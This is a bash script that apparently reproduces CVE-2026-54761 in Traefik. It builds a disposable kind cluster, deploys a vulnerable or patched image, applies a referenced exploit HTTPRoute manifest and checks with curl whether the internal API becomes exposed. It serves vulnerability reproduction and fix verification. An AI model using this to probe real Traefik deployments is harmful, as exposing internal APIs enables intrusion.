#!/usr/bin/env bash
set -euo pipefail

cluster_name="cve-2026-54761"
poc_dir="/opt/poc"
gateway_api_version="v1.5.0"
mode="${TARGET_MODE:-vulnerable}"
vulnerable_image="traefik:v3.7.1@sha256:6b9cbca6fac42ab0075f5437d8dc1685cfd188626d8d515839ea94f8b6271c42"
fixed_image="traefik:v3.7.5@sha256:e4d98158c01ad752fc1071d4e9573788747230d902cdde00a772516e692d07c9"
whoami_image="traefik/whoami:v1.11.0@sha256:200689790a0a0ea48ca45992e0450bc26ccab5307375b41c84dfc4f2475937ab"

if [ "${mode}" = "fixed" ]; then
    target_image="${fixed_image}"
else
    target_image="${vulnerable_image}"
fi

cleanup() {
    if [ "${KEEP_CLUSTER:-0}" = "1" ]; then
        echo "[*] KEEP_CLUSTER=1, leaving the kind cluster running"
        return
    fi
    echo "[*] Deleting the disposable kind cluster"
    kind delete cluster --name "${cluster_name}" >/dev/null 2>&1 || true
}

trap cleanup EXIT

echo "[*] Waiting for the nested Docker daemon"
for _ in $(seq 1 60); do
    if docker info >/dev/null 2>&1; then
        break
    fi
    sleep 1
done
docker info >/dev/null

kind delete cluster --name "${cluster_name}" >/dev/null 2>&1 || true
echo "[*] Creating a disposable kind cluster"
kind create cluster --name "${cluster_name}" \
    --image "kindest/node:v1.34.0@sha256:7416a61b42b1662ca6ca89f02028ac133a309a2a30ba309614e8ec94d976dc5a" \
    --config "${poc_dir}/kind-config.yaml"

echo "[*] Target image: ${target_image}"
echo "[*] Backend image: ${whoami_image}"

echo "[*] Installing Gateway API CRDs"
kubectl apply --server-side \
    -f "https://github.com/kubernetes-sigs/gateway-api/releases/download/${gateway_api_version}/experimental-install.yaml"

kubectl apply -f "${poc_dir}/traefik-v371.yaml"
if [ "${mode}" = "fixed" ]; then
    kubectl set image -n traefik deployment/traefik "traefik=${fixed_image}"
    kubectl rollout status -n traefik deployment/traefik --timeout=180s
else
    kubectl wait -n traefik --for=condition=available deployment/traefik --timeout=180s
fi
kubectl apply -f "${poc_dir}/gateway-exploit.yaml"
kubectl wait -n attacker --for=condition=available deployment/whoami --timeout=180s

echo "[*] Waiting for Traefik to process the routes"
sleep 10

control_status="$(curl -sS -o /dev/null -w '%{http_code}' \
    -H 'Host: control.localhost' http://127.0.0.1:80/api/http/services)"
echo "Control route status: ${control_status}"

exploit_body=""
if [ "${mode}" = "fixed" ]; then
    request_attempts=5
else
    request_attempts=60
fi

for _ in $(seq 1 "${request_attempts}"); do
    exploit_body="$(curl -sS -H 'Host: exploit.localhost' \
        http://127.0.0.1:80/api/http/services || true)"
    if printf '%s' "${exploit_body}" | grep -q 'api@internal'; then
        break
    fi
    sleep 2
done

if [ "${control_status}" = "404" ] && printf '%s' "${exploit_body}" | grep -q 'api@internal'; then
    if [ "${mode}" = "vulnerable" ]; then
        echo "[+] VULNERABLE: an untrusted HTTPRoute exposed api@internal."
        exit 0
    fi
    echo "[-] Patched Traefik exposed api@internal."
    exit 1
fi

if [ "${mode}" = "fixed" ] && ! printf '%s' "${exploit_body}" | grep -q 'api@internal'; then
    echo "[+] FIXED: the untrusted HTTPRoute did not expose api@internal."
    exit 0
fi

echo "[-] The bypass was not reproduced."
printf '%s\n' "${exploit_body}"
kubectl get httproute -n attacker -o yaml
kubectl logs -n traefik deployment/traefik
exit 1

